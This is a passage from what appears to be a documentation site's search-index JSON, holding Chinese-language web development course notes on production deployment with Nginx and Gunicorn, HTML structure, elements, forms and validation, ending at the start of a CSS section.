(\u670d\u52a1\u9759\u6001\u5185\u5bb9): \u53ef\u4ee5\u76f4\u63a5\u5904\u7406\u9759\u6001\u6587\u4ef6\u8bf7\u6c42 (\u5982 CSS, JS, \u56fe\u7247)\uff0c\u65e0\u9700\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u540e\u7aef\u670d\u52a1\u5668\u3002</li> <li>Handle encryption and decryption (\u5904\u7406\u52a0\u5bc6\u548c\u89e3\u5bc6): \u8d1f\u8d23\u5904\u7406\u6765\u81ea\u5ba2\u6237\u7aef\u7684 HTTPS \u8bf7\u6c42\u7684\u52a0\u5bc6\u548c\u89e3\u5bc6\u8fc7\u7a0b\u3002\u8fd9\u53ef\u4ee5\u51cf\u8f7b\u540e\u7aef\u670d\u52a1\u5668\u7684\u8ba1\u7b97\u8d1f\u62c5\uff0c\u6709\u65f6\u53ef\u4ee5\u4f7f\u7528\u4e13\u7528\u786c\u4ef6\u52a0\u901f\u3002</li> <li>Filter suspicious traffic and protect against attacks (\u8fc7\u6ee4\u53ef\u7591\u6d41\u91cf\u548c\u9632\u5fa1\u653b\u51fb): \u4f5c\u4e3a\u7b2c\u4e00\u9053\u9632\u7ebf\uff0c\u53ef\u4ee5\u8fc7\u6ee4\u6076\u610f\u8bf7\u6c42\uff0c\u5e76\u5bf9 DDoS \u653b\u51fb\u63d0\u4f9b\u4e00\u5b9a\u7684\u4fdd\u62a4\u3002</li> </ul> </li> </ul> </li> <li> <p>Upgrading to production-grade tools (\u5347\u7ea7\u5230\u751f\u4ea7\u7ea7\u5de5\u5177):</p> <ul> <li>\u4e3a\u4e86\u5b89\u5168\u6027\u548c\u53ef\u4f38\u7f29\u6027\uff0c\u5f00\u53d1\u9636\u6bb5\u4f7f\u7528\u7684\u5de5\u5177\uff08\u5982 Flask \u5f00\u53d1\u670d\u52a1\u5668\u548c SQLite\uff09\u4e0d\u9002\u5408\u516c\u5f00\u90e8\u7f72\u3002</li> <li>Database: \u4f7f\u7528 MySQL (\u6216 PostgreSQL) \u4ee3\u66ff SQLite\u3002MySQL \u662f\u670d\u52a1\u5668\u6570\u636e\u5e93\uff0c\u53ef\u4ee5\u8fd0\u884c\u5728\u72ec\u7acb\u673a\u5668\u4e0a\uff0c\u652f\u6301\u591a\u4e2a Web \u670d\u52a1\u5668\u8bbf\u95ee\uff0c\u6027\u80fd\u66f4\u597d\uff0c\u5e76\u5177\u6709\u5185\u7f6e\u8ba4\u8bc1\u673a\u5236\u3002SQLite \u662f\u5d4c\u5165\u5f0f\u6570\u636e\u5e93\uff0c\u901a\u5e38\u5b58\u50a8\u4e3a\u672c\u5730\u6587\u4ef6\u3002</li> <li>Web Server: \u4f7f\u7528 Gunicorn (\u6216\u5176\u4ed6 WSGI \u670d\u52a1\u5668) \u4ee3\u66ff Flask \u5f00\u53d1\u670d\u52a1\u5668\u3002Gunicorn \u5b9e\u73b0\u4e86 WSGI \u6807\u51c6\uff0c\u80fd\u66f4\u9ad8\u6548\u3001\u5b89\u5168\u5730\u5904\u7406\u751f\u4ea7\u73af\u5883\u7684 Web \u8bf7\u6c42\u3002</li> <li>Reverse Proxy: \u4f7f\u7528 Nginx (\u6216\u5176\u4ed6\u5982 Apache HTTP Server) \u4f5c\u4e3a\u9762\u5411\u5916\u90e8\u7684\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\u3002Nginx \u64c5\u957f\u5904\u7406\u9759\u6001\u6587\u4ef6\u3001SSL \u7ec8\u6b62\uff08encryption/decryption\uff09\u548c\u8bf7\u6c42\u8def\u7531\u3002</li> </ul> </li> </ol> <p>\u5728 Flask \u5e94\u7528\u7a0b\u5e8f\u90e8\u7f72\u7684\u4f8b\u5b50\u4e2d (\u5982 Heroku \u90e8\u7f72)\uff0c\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u6570\u636e\u5e93\uff08\u53ef\u80fd\u7531\u670d\u52a1\u5546\u63d0\u4f9b\uff09\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u5730\u65b9\uff0c\u4e00\u4e2a\u8fd0\u884c Gunicorn \u7684\u4e3b\u670d\u52a1\u5668\uff08\u8d77\u6e90\u670d\u52a1\u5668\uff0corigin server\uff09\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u903b\u8f91\uff0c\u4ee5\u53ca\u4e00\u4e2a Nginx \u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\u5904\u7406\u5916\u90e8\u6d41\u91cf\u548c\u9759\u6001\u5185\u5bb9\u3002\u4e3b\u670d\u52a1\u5668\u548c\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\u53ef\u80fd\u6700\u521d\u90e8\u7f72\u5728\u540c\u4e00\u53f0\u7269\u7406\u673a\u5668\u4e0a\uff0c\u4f46\u8fd9\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u914d\u7f6e\u66f4\u6539\u6765\u5206\u79bb\u5230\u4e0d\u540c\u673a\u5668\u4e0a\u4ee5\u5b9e\u73b0\u66f4\u5927\u89c4\u6a21\u7684\u6269\u5c55\u3002</p> <p>\u7406\u89e3\u8fd9\u4e9b\u7ec4\u4ef6\u7684\u4f5c\u7528\u4ee5\u53ca\u5b83\u4eec\u5982\u4f55\u534f\u540c\u5de5\u4f5c\uff0c\u5bf9\u4e8e\u7406\u89e3 Web \u5e94\u7528\u7a0b\u5e8f\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u7684\u8fd0\u884c\u81f3\u5173\u91cd\u8981\u3002</p>"},{"location":"cs/mern/3403/l2/","title":"2.0 HTML","text":""},{"location":"cs/mern/3403/l2/#purpose-of-html","title":"Purpose of HTML","text":"<p>HTML\uff08Hyper Text Markup Language\uff09\u63cf\u8ff0\u4e86\u7f51\u9875\u7684 semantic content\uff08\u8bed\u4e49\u5185\u5bb9\uff09\u4ee5\u53ca\u5185\u5bb9\u4e4b\u95f4\u7684 logical relationships\uff08\u903b\u8f91\u5173\u7cfb\uff09\u3002\u5b83\u6700\u521d\u7531 Tim Berners-Lee \u4e8e 1990 \u5e74\u5b9a\u4e49\u4e3a SGML \u7684\u4e00\u79cd\u7c7b\u578b\u3002Hypertext\uff08\u8d85\u6587\u672c\uff09\u662f Web \u7684\u4e00\u4e2a\u5173\u952e\u5356\u70b9\u3002</p>"},{"location":"cs/mern/3403/l2/#html-philosophy","title":"HTML philosophy","text":"<p>HTML5 \u4e8e 2008 \u5e74\u53d1\u5e03\uff0c\u662f\u4e00\u6b21\u91cd\u5927\u7684\u4fee\u8ba2\u3002HTML5 \u7684\u54f2\u5b66\u5305\u62ec\uff1a</p> <ul> <li>Interoperability\uff08\u4e92\u64cd\u4f5c\u6027\uff09\uff1a\u5e94\u80fd\u5728\u591a\u79cd\u6d4f\u89c8\u5668\u4e0a\u5448\u73b0\u3002</li> <li>Graceful error recovery\uff08\u4f18\u96c5\u7684\u9519\u8bef\u6062\u590d\uff09\uff1a\u5c0f\u9519\u8bef\u4e0d\u5e94\u963b\u6b62\u9875\u9762\u6e32\u67d3\u3002</li> <li>Backwards compatible\uff08\u5411\u540e\u517c\u5bb9\uff09\uff1a\u65b0\u7279\u6027\u4e0d\u5e94\u7834\u574f\u73b0\u6709\u7f51\u9875\u3002</li> <li>Prioritise users\uff08\u7528\u6237\u4f18\u5148\uff09\uff1a\u7528\u6237 &gt; \u7f51\u9875\u8bbe\u8ba1\u8005 &gt; \u6d4f\u89c8\u5668\u5b9e\u73b0\u8005 &gt; \u7406\u8bba\u5bb6\u3002</li> <li>Separation of concerns\uff08\u5173\u6ce8\u70b9\u5206\u79bb\uff09\uff1a\u63cf\u8ff0\u4fe1\u606f\u7684\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u5176\u663e\u793a\u65b9\u5f0f\u3002</li> </ul> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4e3a\u4e86\u7b26\u5408 HTML5 \u54f2\u5b66\uff0c\u7f51\u9875\u6d4f\u89c8\u5668\u6e32\u67d3\u5668\u975e\u5e38\u5bbd\u677e\u3002\u6d4f\u89c8\u5668\u4f1a\u5ffd\u7565\u672a\u8bc6\u522b\u7684\u6807\u7b7e\u3001\u6362\u884c\u7b26\u3001\u5236\u8868\u7b26\u3001\u591a\u4e2a\u7a7a\u683c\u3002\u751a\u81f3\u53ef\u4ee5\u4e0d\u9700\u8981 <code>&lt;htm&gt;</code>, <code>&lt;head&gt;</code>, <code>&lt;body&gt;</code> \u7b49\u5173\u952e\u6587\u6863\u6807\u7b7e\uff0c\u4ee5\u53ca\u5339\u914d\u7684\u5f00\u95ed\u6807\u7b7e\uff08\u5c3d\u7ba1\u5f3a\u70c8\u5efa\u8bae\u5339\u914d\uff0c\u56e0\u4e3a\u8fd9\u662f bugs \u7684\u7b80\u5355\u6765\u6e90\uff09\u3002\u6807\u7b7e\u66f4\u50cf\u662f\u5bf9\u6d4f\u89c8\u5668\u7684\u5efa\u8bae\uff0c\u751a\u81f3\u53ef\u80fd\u88ab\u5ffd\u7565\u3002</p>"},{"location":"cs/mern/3403/l2/#html-document-structure-mapping","title":"HTML Document Structure Mapping","text":"<p>\u4e00\u4e2a HTML \u6587\u6863\u7531 elements\uff08\u5143\u7d20\uff09\u7ec4\u6210\u3002\u4e00\u4e2a\u5143\u7d20\u901a\u5e38\u7531 opening and closing tags\uff08\u5f00\u95ed\u6807\u7b7e\uff09\u53ca\u5176\u4e4b\u95f4\u7684 content\uff08\u5185\u5bb9\uff09\u6784\u6210\u3002\u5143\u7d20\u7684\u5185\u5bb9\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u5143\u7d20\u3002\u56e0\u6b64\uff0cHTML \u6587\u6863\u662f\u4e00\u4e2a tree data structure\uff08\u6811\u5f62\u6570\u636e\u7ed3\u6784\uff09\u3002</p> <p>HTML5 \u6587\u6863\u901a\u5e38\u4ee5 <code>&lt;!DOCTYPE html&gt;</code> \u58f0\u660e\u5f00\u59cb\u3002\u6587\u6863\u7684 root\uff08\u6839\uff09\u662f <code>&lt;html&gt;</code> \u6807\u7b7e\u3002\u6587\u6863\u5305\u542b <code>&lt;head&gt;</code> \u548c <code>&lt;body&gt;</code>\u3002<code>&lt;title&gt;</code> \u6807\u7b7e\u7528\u4e8e\u4e3a\u6587\u6863\u8bbe\u7f6e\u6807\u9898\uff0c\u901a\u5e38\u663e\u793a\u5728\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u6807\u9898\u680f\u4e2d\u3002Visible elements\uff08\u53ef\u89c1\u5143\u7d20\uff09\u4f4d\u4e8e <code>&lt;body&gt;</code> \u5206\u652f\u4e0a\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Page Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Main Heading&lt;/h1&gt;\n    &lt;p&gt;Some content.&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"cs/mern/3403/l2/#common-html-elements-and-attributes","title":"Common HTML Elements and Attributes","text":"<p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684 HTML \u5143\u7d20\u53ca\u5176\u76ee\u7684\u548c\u5c5e\u6027\uff1a</p> <ul> <li>Text Elements</li> </ul> <p>\uff08\u6587\u672c\u5143\u7d20\uff09\uff1a</p> <ul> <li>Headings: <code>&lt;h1&gt;</code>, <code>&lt;h2&gt;</code>, <code>&lt;h3&gt;</code>, <code>&lt;h4&gt;</code> \u7b49\u7528\u4e8e\u5b9a\u4e49\u4e0d\u540c\u7ea7\u522b\u7684\u6807\u9898\u3002</li> <li>Paragraphs: <code>&lt;p&gt;</code> \u7528\u4e8e\u5b9a\u4e49\u6bb5\u843d\u3002</li> <li>Code: <code>&lt;code&gt;</code> \u7528\u4e8e\u8868\u793a\u4ee3\u7801\u7247\u6bb5\u3002</li> <li>Emphasis: <code>&lt;em&gt;</code> \u7528\u4e8e\u8868\u793a\u5f3a\u8c03\u6587\u672c\u3002 \u8fd9\u4e9b\u5143\u7d20\u53ef\u4ee5\u5d4c\u5957\u3002\u7279\u6b8a\u5b57\u7b26\u4f7f\u7528 <code>&amp;\u2026;</code> \u8868\u793a\u3002</li> </ul> <ul> <li>Attributes\uff08\u5c5e\u6027\uff09\uff1a\u6240\u6709 HTML \u6807\u7b7e\u90fd\u53ef\u4ee5\u6709\u4e00\u7cfb\u5217\u5c5e\u6027\uff0c\u5b83\u4eec\u51fa\u73b0\u5728\u5f00\u95ed\u6807\u7b7e\u7684\u540d\u79f0\u548c\u53f3\u62ec\u53f7\u4e4b\u95f4\u3002</li> </ul> <ul> <li>Images\uff08\u56fe\u50cf\uff09\uff1a\u4f7f\u7528 <code>&lt;img/&gt;</code> \u6807\u7b7e\u63d2\u5165\u56fe\u50cf\uff0c\u9700\u8981 <code>src</code> \u5c5e\u6027\u6307\u5b9a\u56fe\u50cf\u6e90\u3002<code>alt</code> \u5c5e\u6027\u63d0\u4f9b\u66ff\u4ee3\u6587\u672c\uff0c\u7528\u4e8e\u56fe\u50cf\u65e0\u6cd5\u663e\u793a\u6216\u5c4f\u5e55\u9605\u8bfb\u5668\u3002 \u4f8b\u5982\uff1a<code>&lt;img src=\"logo.png\" alt=\"Company Logo\"/&gt;</code></li> </ul> <ul> <li>Lists</li> </ul> <p>\uff08\u5217\u8868\uff09\uff1a</p> <ul> <li>Ordered List\uff08\u6709\u5e8f\u5217\u8868\uff09\uff1a\u4f7f\u7528 <code>&lt;ol&gt;</code> \u6807\u7b7e\u3002<code>type</code> \u5c5e\u6027\u53ef\u4ee5\u6539\u53d8\u5217\u8868\u6807\u8bb0\uff08\u5982\u5b57\u6bcd\uff09\u3002</li> <li>Unordered List\uff08\u65e0\u5e8f\u5217\u8868\uff09\uff1a\u4f7f\u7528 <code>&lt;ul&gt;</code> \u6807\u7b7e\u3002<code>type</code> \u5c5e\u6027\u53ef\u4ee5\u6539\u53d8\u5217\u8868\u6807\u8bb0\uff08\u5982\u65b9\u5f62\uff09\u3002</li> <li>List Items: \u5217\u8868\u9879\u4f7f\u7528 <code>&lt;li&gt;</code> \u6807\u7b7e\u4f5c\u4e3a <code>&lt;ol&gt;</code> \u6216 <code>&lt;ul&gt;</code> \u7684\u5185\u5bb9\u3002 \u4f8b\u5982\uff1a</li> </ul> <pre><code>&lt;ol type=\"A\"&gt;\n    &lt;li&gt;First item&lt;/li&gt;\n    &lt;li&gt;Second item&lt;/li&gt;\n&lt;/ol&gt;\n&lt;ul&gt;\n    &lt;li&gt;Item A&lt;/li&gt;\n    &lt;li&gt;Item B&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre> <ul> <li>Tables</li> </ul> <p>\uff08\u8868\u683c\uff09\uff1a\u4f7f\u7528 </p> <pre><code>&lt;table&gt;\n</code></pre> <p>\u6807\u7b7e\u5b9a\u4e49\u8868\u683c\u3002\u6bcf\u884c\u4f7f\u7528 </p> <pre><code>&lt;tr&gt;\n</code></pre> <p>\u3002\u884c\u6807\u9898\u4f7f\u7528 </p> <pre><code>&lt;th&gt;\n</code></pre> <p>\u3002\u6570\u636e\u5355\u5143\u683c\u4f7f\u7528 </p> <pre><code>&lt;td&gt;\n</code></pre> <p>\u3002 \u4f8b\u5982\uff1a</p> <pre><code>&lt;table&gt;\n    &lt;tr&gt;\n        &lt;th&gt;Header 1&lt;/th&gt;\n        &lt;th&gt;Header 2&lt;/th&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n        &lt;td&gt;Data 1&lt;/td&gt;\n        &lt;td&gt;Data 2&lt;/td&gt;\n    &lt;/tr&gt;\n&lt;/table&gt;\n</code></pre> <p>\u8868\u683c\u5c5e\u6027\u5305\u62ec </p> <pre><code>cellspacing\n</code></pre> <p>\uff08\u8bbe\u7f6e\u5355\u5143\u683c\u95f4\u8ddd\uff09\u3001</p> <pre><code>cellpadding\n</code></pre> <p>\uff08\u8bbe\u7f6e\u5355\u5143\u683c\u5185\u5bb9\u4e0e\u5185\u58c1\u7684\u95f4\u8ddd\uff09\u548c </p> <pre><code>border\n</code></pre> <p>\uff08\u8bbe\u7f6e\u5355\u5143\u683c\u8fb9\u6846\u5bbd\u5ea6\uff0c\u6ca1\u6709\u5219\u65e0\u53ef\u89c1\u8fb9\u6846\uff09\u3002</p> <p>\u91cd\u8981\u63d0\u793a</p> <p>\u975e\u5e38\u4e0d\u5efa\u8bae\u4f7f\u7528\u65e0\u8fb9\u6846\u8868\u683c\u8fdb\u884c\u7f51\u9875\u5e03\u5c40\uff0c\u56e0\u4e3a\u5b83\u8fdd\u53cd\u8bed\u4e49\u610f\u56fe\uff08\u5c4f\u5e55\u9605\u8bfb\u5668\u4f1a\u5c06\u5176\u8bfb\u4f5c\u8868\u683c\uff09\u3001\u6d4f\u89c8\u5668\u53ef\u80fd\u4ecd\u7136\u5c06\u5176\u6e32\u67d3\u4e3a\u8868\u683c\u3001\u96be\u4ee5\u7ef4\u62a4\u4e14\u6e32\u67d3\u901f\u5ea6\u6162\u3002</p> <ul> <li>Hypertext Links\uff08\u8d85\u6587\u672c\u94fe\u63a5\uff09\uff1a\u4f7f\u7528 <code>&lt;a&gt;</code> (anchor) \u6807\u7b7e\u521b\u5efa\u94fe\u63a5\uff0c\u9700\u8981 <code>href</code> (hypertext reference) \u5c5e\u6027\u6307\u5b9a\u94fe\u63a5\u76ee\u6807\u3002<code>&lt;a&gt;</code> \u6807\u7b7e\u7684\u5185\u5bb9\u662f\u6587\u6863\u4e2d\u7684\u53ef\u89c1\u94fe\u63a5\uff08\u53ef\u4ee5\u662f\u6587\u672c\u3001\u56fe\u50cf\u7b49\uff09\u3002 \u4f8b\u5982\uff1a<code>&lt;a href=\"https://www.example.com\"&gt;Visit Example&lt;/a&gt;</code> \u94fe\u63a5\u53ef\u4ee5\u5728\u540c\u4e00\u9875\u9762\u6216\u540c\u4e00\u7f51\u7ad9\u5185\u4f7f\u7528 relative addressing\uff08\u76f8\u5bf9\u5730\u5740\uff09\uff0c\u800c\u4e0d\u662f absolute addressing\uff08\u7edd\u5bf9\u5730\u5740\uff09\u3002\u53ef\u4ee5\u901a\u8fc7 <code>id</code> \u5c5e\u6027\u94fe\u63a5\u5230\u540c\u4e00\u6587\u6863\u4e2d\u7684\u5143\u7d20\u3002\u94fe\u63a5\u53ef\u4ee5\u6307\u5411\u4efb\u4f55\u6587\u4ef6\uff0c\u4e0d\u9650\u4e8e HTML\u3002 \u4f8b\u5982\uff08\u94fe\u63a5\u5230\u540c\u4e00\u9875\u9762\u5185\u7684\u5143\u7d20\uff09\uff1a<code>&lt;a href=\"#section2\"&gt;Go to Section 2&lt;/a&gt;</code> (\u5047\u8bbe\u9875\u9762\u4e2d\u6709 <code>&lt;h2 id=\"section2\"&gt;</code>)</li> </ul> <ul> <li>Grouping Elements</li> </ul> <p>\uff08\u5206\u7ec4\u5143\u7d20\uff09\uff1a</p> <ul> <li><code>&lt;span&gt;</code>: \u7528\u4e8e\u5206\u7ec4 inline content\uff08\u884c\u5185\u5185\u5bb9\uff09\uff0c\u5982\u53e5\u5b50\u4e2d\u7684\u5355\u8bcd\u3002\u9ed8\u8ba4\u4e0d\u6e32\u67d3\u3002</li> <li><code>&lt;div&gt;</code>: \u7528\u4e8e\u5206\u7ec4 multi-line block\uff08\u591a\u884c\u5757\uff09\u5185\u5bb9\uff0c\u5982\u591a\u4e2a\u6bb5\u843d\u6216\u56fe\u50cf\u3002\u9ed8\u8ba4\u4e0d\u6e32\u67d3\u3002 \u8fd9\u4e9b\u5143\u7d20\u901a\u5e38\u7528\u4e8e\u5171\u540c\u683c\u5f0f\u5316\u6216\u6846\u9009\u5143\u7d20\u3002</li> </ul> <ul> <li>Advanced Layout Elements</li> </ul> <p>\uff08\u9ad8\u7ea7\u5e03\u5c40\u5143\u7d20\uff09\uff1aHTML5 \u5f15\u5165\u4e86\u4e00\u4e9b\u5177\u6709\u8bed\u4e49\u76ee\u7684\u7684\u5e03\u5c40\u5143\u7d20\u3002</p> <ul> <li><code>&lt;canvas&gt;</code>: \u521b\u5efa\u4e00\u4e2a\u77e9\u5f62\u533a\u57df\uff0c\u53ef\u4ee5\u4f7f\u7528 JavaScript \u7ed8\u5236\u4f4d\u56fe\u56fe\u5f62\uff0c\u7528\u4e8e\u521b\u5efa\u4ea4\u4e92\u5f0f\u52a8\u753b\u548c\u6e38\u620f\u3002</li> <li><code>&lt;header&gt;</code>: \u5305\u542b\u7ae0\u8282\u6216\u9875\u9762\u7684\u4ecb\u7ecd\u6027\u4fe1\u606f\u3002</li> <li><code>&lt;nav&gt;</code>: \u7528\u4e8e\u5305\u542b\u6587\u6863\u5bfc\u822a\u94fe\u63a5\u7684\u90e8\u5206\u3002</li> <li><code>&lt;section&gt;</code>: \u4ee3\u8868\u901a\u7528\u7684\u6587\u6863\u6216\u5e94\u7528\u90e8\u5206\uff0c\u7c7b\u4f3c\u4e8e <code>&lt;div&gt;</code>\u3002</li> <li><code>&lt;article&gt;</code>: \u4ee3\u8868\u9875\u9762\u4e2d\u53ef\u72ec\u7acb\u5b58\u5728\u7684\u90e8\u5206\uff0c\u5982\u535a\u5ba2\u6587\u7ae0\u6216\u8bba\u575b\u6761\u76ee\u3002</li> <li><code>&lt;aside&gt;</code>: \u4ee3\u8868\u4e0e\u6587\u6863\u4e3b\u8981\u533a\u57df\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u901a\u5e38\u5728\u4fa7\u8fb9\u680f\u4e2d\uff08\u5982\u76f8\u5173\u6587\u7ae0\u3001\u6807\u7b7e\u4e91\uff09\u3002</li> <li><code>&lt;footer&gt;</code>: \u7528\u4e8e\u6807\u8bb0\u5f53\u524d\u9875\u9762\u6216\u9875\u9762\u4e2d\u6bcf\u4e2a\u7ae0\u8282\u7684\u9875\u811a\u3002</li> </ul>"},{"location":"cs/mern/3403/l2/#html-forms-input-types-and-submission","title":"HTML Forms, Input Types, and Submission","text":"<p><code>&lt;form&gt;</code> \u5143\u7d20\u662f\u83b7\u53d6\u6d4f\u89c8\u5668\u4fe1\u606f\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u6807\u51c6\u65b9\u5f0f\u3002\u5728 <code>&lt;form&gt;</code> \u5185\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>&lt;input&gt;</code> \u5143\u7d20\u81ea\u52a8\u521b\u5efa\u7528\u4e8e\u6536\u96c6\u4fe1\u606f\u7684\u63a7\u4ef6\uff08\u5982\u6587\u672c\u6846\u3001\u5355\u9009\u6309\u94ae\u3001\u590d\u9009\u6846\uff09\u3002<code>&lt;input&gt;</code> \u5143\u7d20\u53ef\u4ee5\u4f7f\u7528 <code>&lt;fieldset&gt;</code> \u5143\u7d20\u5206\u7ec4\u3002\u53ef\u4ee5\u4f7f\u7528 <code>&lt;label&gt;</code> \u5143\u7d20\u4e3a <code>&lt;input&gt;</code> \u521b\u5efa\u6807\u7b7e\uff0c\u5e76\u901a\u8fc7 <code>for</code> \u5c5e\u6027\u4e0e\u5bf9\u5e94 <code>&lt;input&gt;</code> \u7684 <code>id</code> \u5c5e\u6027\u94fe\u63a5\u3002</p> <p>Input Type Attributes\uff08\u8f93\u5165\u7c7b\u578b\u5c5e\u6027\uff09\uff1a <code>&lt;input&gt;</code> \u5143\u7d20\u7684 <code>type</code> \u5c5e\u6027\u51b3\u5b9a\u4e86\u5b83\u5982\u4f55\u6e32\u67d3\u3002\u5e38\u89c1\u7684\u7c7b\u578b\u6709\uff1a<code>button</code>, <code>checkbox</code>, <code>color</code>, <code>date</code>, <code>email</code>, <code>file</code>, <code>image</code>, <code>month</code>, <code>number</code>, <code>password</code>, <code>radio</code>, <code>range</code>, <code>reset</code>, <code>search</code>, <code>submit</code>, <code>tel</code>, <code>text</code>, <code>time</code>, <code>url</code>, <code>week</code> \u7b49\u3002 \u5176\u4ed6\u8f93\u5165\u5c5e\u6027\u5305\u62ec\uff1a</p> <ul> <li><code>value</code>: \u8bbe\u7f6e\u8f93\u5165\u7684\u521d\u59cb\u503c\u3002</li> <li><code>readonly</code>: \u610f\u5473\u7740\u7528\u6237\u4e0d\u80fd\u7f16\u8f91\u5b83\u3002</li> <li><code>placeholder</code>: \u63d0\u4f9b\u8f93\u5165\u503c\u7c7b\u578b\u7684\u63d0\u793a\u3002</li> <li><code>required</code>: \u5f3a\u5236\u7528\u6237\u8f93\u5165\u503c\u3002 \u8bb8\u591a\u5c5e\u6027\u4f9d\u8d56\u4e8e\u4f7f\u7528\u7684\u7c7b\u578b\uff0c\u4f8b\u5982 <code>autocomplete</code>, <code>min</code>, <code>max</code>\u3002\u4f7f\u7528\u6b63\u786e\u7684 semantic input type\uff08\u8bed\u4e49\u8f93\u5165\u7c7b\u578b\uff09\u53ef\u4ee5\u65b9\u4fbf\u7528\u6237\uff0c\u4f8b\u5982\uff0c\u4f7f\u7528 <code>email</code>, <code>url</code>, <code>tel</code> \u800c\u975e\u7eaf\u6587\u672c\u65f6\uff0c\u5c4f\u5e55\u952e\u76d8\u4f1a\u76f8\u5e94\u6539\u53d8\u3002</li> </ul> <p>Form Submission\uff08\u8868\u5355\u63d0\u4ea4\uff09\uff1a \u8868\u5355\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u8f93\u5165\u7c7b\u578b <code>submit</code>\uff0c\u5b83\u751f\u6210\u4e00\u4e2a\u63d0\u4ea4\u6309\u94ae\u3002\u5f53\u70b9\u51fb\u8868\u5355\u7684\u63d0\u4ea4\u6309\u94ae\u65f6\uff0c\u8868\u5355\u7684\u5f53\u524d\u503c\u4f1a\u53d1\u9001\u5230 <code>action</code> \u5c5e\u6027\u6307\u5b9a\u7684\u670d\u52a1\u5668 URL\u3002\u6bcf\u4e2a\u8f93\u5165\u7684\u503c\u4f5c\u4e3a key-value pair\uff08\u952e\u503c\u5bf9\uff09\u53d1\u9001\uff0c\u5176\u4e2d key \u662f <code>name</code> \u5c5e\u6027\u7684\u503c\u3002<code>&lt;form&gt;</code> \u6807\u7b7e\u4e0a\u7684 <code>method</code> \u5c5e\u6027\u51b3\u5b9a\u4e86\u4f20\u8f93\u503c\u7684\u534f\u8bae\u3002</p> <ul> <li><code>get</code> \u65b9\u6cd5\u5c06\u8868\u5355\u503c\u9644\u52a0\u5230\u670d\u52a1\u5668\u8bf7\u6c42\u7684 URL \u4e2d\u3002</li> <li><code>post</code> \u65b9\u6cd5\u5219\u5c06\u503c\u7f16\u7801\u5728\u670d\u52a1\u5668\u8bf7\u6c42\u7684 body \u4e2d\u3002</li> </ul> <p>\u4f8b\u5982\uff0c\u4e00\u4e2a\u4f7f\u7528 <code>get</code> \u65b9\u6cd5\u7684\u8868\u5355\uff1a</p> <pre><code>&lt;form action=\"/action_page.php\" method=\"get\"&gt;\n  &lt;label for=\"mail\"&gt;Email:&lt;/label&gt;\n  &lt;input type=\"email\" id=\"mail\" name=\"my-mail\"&gt;\n  &lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n</code></pre> <p>\u63d0\u4ea4\u540e\u53ef\u80fd\u4f1a\u53d1\u9001\u8bf7\u6c42 <code>/action_page.php?my-mail=whiskers@gmail.com</code>\u3002</p>"},{"location":"cs/mern/3403/l2/#html-form-validation","title":"HTML Form Validation","text":"<p>\u786e\u4fdd\u7528\u6237\u5728\u8868\u5355\u4e2d\u8f93\u5165\u6709\u6548\u6570\u636e\u6709\u4e24\u79cd\u4e3b\u8981\u65b9\u6cd5\uff1a</p> <ol> <li>Native HTML validation</li> </ol> <p>\uff08\u539f\u751f HTML \u9a8c\u8bc1\uff09\uff1a</p> <ul> <li>\u5bf9 <code>email</code>, <code>url</code>, <code>tel</code> \u8f93\u5165\u7c7b\u578b\u63d0\u4f9b\u81ea\u52a8\u57fa\u672c\u9a8c\u8bc1\u3002</li> <li>\u63d0\u4f9b\u5404\u79cd\u4f9d\u8d56\u4e8e\u7c7b\u578b\u7684\u9a8c\u8bc1\u5c5e\u6027\uff1a<ul> <li>\u5bf9\u4e8e\u6570\u5b57\u8f93\u5165 (<code>number</code>, <code>range</code>)\uff1a<code>max</code>, <code>min</code>, <code>step</code>\u3002</li> <li>\u5bf9\u4e8e\u6587\u672c\u8f93\u5165 (<code>text</code>, <code>email</code>, <code>search</code>, <code>url</code>, <code>tel</code>, <code>password</code>)\uff1a<code>maxlength</code>, <code>pattern</code>\u3002</li> </ul> </li> </ul> <ol> <li>JavaScript validation</li> </ol> <p>\uff08JavaScript \u9a8c\u8bc1\uff09\uff1a</p> <ul> <li>\u5728\u6d4f\u89c8\u5668\u4e2d\u4f7f\u7528 JavaScript \u7f16\u5199\u4ee3\u7801\u6765\u68c0\u67e5\u8f93\u5165\uff0c\u8fd9\u66f4\u7075\u6d3b\u3002</li> </ul> <p>\u91cd\u8981\u63d0\u793a\uff1aClient-side validation\uff08\u5ba2\u6237\u7aef\u9a8c\u8bc1\uff09\uff0c\u65e0\u8bba\u4f7f\u7528\u54ea\u79cd\u65b9\u6cd5\uff0c\u90fd\u975e\u5e38\u5bb9\u6613\u7ed5\u8fc7\u3002\u56e0\u6b64\uff0c\u59cb\u7ec8\u4e5f\u8981\u5728\u670d\u52a1\u5668\u7aef\u9a8c\u8bc1\u60a8\u7684\u503c\u3002</p>"},{"location":"cs/mern/3403/l3/","title":"3.0 CSS","text":""},{"location":"cs/mern/3403/l3/#purpose-of-css","title":"Purpose of CSS","text":"<p>CSS\uff08Cascading Style Sheets\uff09\u662f\u4e00\u79cd\u7528\u4e8e Web 